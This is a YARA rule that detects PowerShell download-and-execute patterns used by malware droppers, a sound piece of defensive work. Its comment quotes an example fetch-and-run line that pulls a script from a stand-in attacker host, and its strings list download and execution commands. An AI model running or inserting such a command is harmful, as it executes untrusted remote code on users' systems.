rule Malicious_PowerShell_Download_Execute {
    /*
     * Detects PowerShell download-and-execute pattern commonly used
     * by initial access payloads and malware droppers.
     *
     * Example match:
     *   IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
     */
    meta:
        description = "PowerShell download and execute pattern"
        severity = "High"
        confidence = "0.85"
        mitre_technique = "T1059.001"
        author = "Script Sentinel"

    strings:
        // Download methods
        $download1 = "DownloadString" nocase
        $download2 = "DownloadFile" nocase
        $download3 = "DownloadData" nocase
        $download4 = "Invoke-WebRequest" nocase
        $download5 = "wget" nocase
        $download6 = "curl" nocase

        // Execution methods
        $exec1 = "Invoke-Expression" nocase
        $exec2 = "IEX" nocase
        $exec3 = "& " nocase

        // URL patterns
        $url = /https?:\/\/[^\s'"]+/ nocase

    condition:
        any of ($download*) and any of ($exec*) and $url
}
